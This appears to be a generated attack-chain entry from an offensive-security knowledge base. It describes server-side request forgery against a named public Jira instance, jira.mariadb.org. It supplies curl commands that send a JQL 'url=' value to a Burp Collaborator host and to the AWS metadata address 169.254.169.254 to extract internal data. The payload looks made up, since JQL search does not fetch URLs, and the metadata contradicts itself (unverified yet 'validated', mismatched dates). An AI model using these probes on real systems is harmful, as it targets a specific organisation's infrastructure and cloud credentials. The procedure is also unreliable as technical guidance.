---
id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
tags:
  - ssrf
  - jira
  - atlassian
  - web-vulnerability
type: attack_chain
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Initial Access]]'
  - '[[Discovery]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T12:00:00Z'
procedures:
  - '[[procedures/Test-SSRF-in-Jira-Instance]]'
  - '[[procedures/Exploit-SSRF-for-Internal-Access]]'
step_count: 2
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Steal Application Access Token]]'
updated_at: '2025-12-14T04:08:55.450Z'
description: >-
  A multi-stage attack chain exploiting a Server-Side Request Forgery (SSRF)
  vulnerability in a publicly exposed Atlassian Jira instance to gain access to
  internal network resources, as reported in MariaDB's HackerOne disclosure.
skill_level: intermediate
impact_level: medium
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Discovery]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Steal Application Access Token]]'
---
# Server-Side Request Forgery in Atlassian Jira Leading to Internal Resource Access

Multi-stage attack chain demonstrating exploitation of an SSRF vulnerability in a public Jira instance to probe internal resources, based on the reported issue in jira.mariadb.org.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 2 |
| Execution Time | ~10 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | Medium |

## Attack Flow Visualization

```mermaid
graph LR
    A[Initial Access: Test Vulnerability] --> B[Execution: Exploit SSRF]
    B --> C[Discovery: Access Internal Resources]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
```

## Prerequisites & Requirements

### Required Tools

- [[tools/Burp-Suite]]
- Browser or curl for requests

### Target Environment

- Publicly accessible Atlassian Jira instance (e.g., version vulnerable to SSRF)
- Web platform with HTTP/HTTPS access
- No specific ports beyond 80/443

### Initial Access Requirements

- Internet access to the target Jira URL
- No credentials required for public instances
- Basic knowledge of web request manipulation

## Detailed Attack Procedures

### Step 1: Test for SSRF Vulnerability
procedure: [[procedures/Test-SSRF-in-Jira-Instance]]

**Objective**: Verify the presence of SSRF in the Jira instance by sending crafted requests to detect if the server makes unintended outbound connections.

**Instructions**: Use [[commands/curl-ssrf-test]] to send a request to a Jira endpoint that processes URLs, such as a plugin or search feature, attempting to access an external service like a Burp Collaborator payload.

```bash
curl -X POST 'https://jira.mariadb.org/rest/api/2/search' -H 'Content-Type: application/json' -d '{"jql":"url=http://burpcollaborator.net/test"}'
```

Monitor the Burp Collaborator for incoming requests from the target server.

**Expected Output**: HTTP response from Jira, potentially with error messages indicating URL processing; confirmation via Collaborator of server-side request.

**Success Indicators**:
- Incoming DNS/HTTP request to Collaborator endpoint
- No direct client-side access to the Collaborator

### Step 2: Exploit SSRF for Internal Access
procedure: [[procedures/Exploit-SSRF-for-Internal-Access]]

**Objective**: Leverage the confirmed SSRF to access internal network resources, such as metadata endpoints or local services.

**Instructions**: Modify the request to target internal URLs, like http://localhost or http://169.254.169.254 (AWS metadata if applicable). Use [[commands/curl-internal-probe]] to craft the payload.

```bash
curl -X POST 'https://jira.mariadb.org/rest/api/2/search' -H 'Content-Type: application/json' -d '{"jql":"url=http://169.254.169.254/latest/meta-data/"}'
```

Analyze the response for leaked internal data.

**Expected Output**: Response containing internal metadata or service responses if SSRF allows blind access.

**Success Indicators**:
- Leaked internal information in Jira response
- Successful probe of non-public endpoints

## Attack Chain Summary

### Key Achievements

1. Confirmed SSRF vulnerability in public Jira instance
2. Demonstrated potential for internal network reconnaissance
3. Highlighted resolution via Jira software upgrade

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[Steal Application Access Token]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Discovery]]

---
*Last updated: 2023-10-01T12:00:00Z*
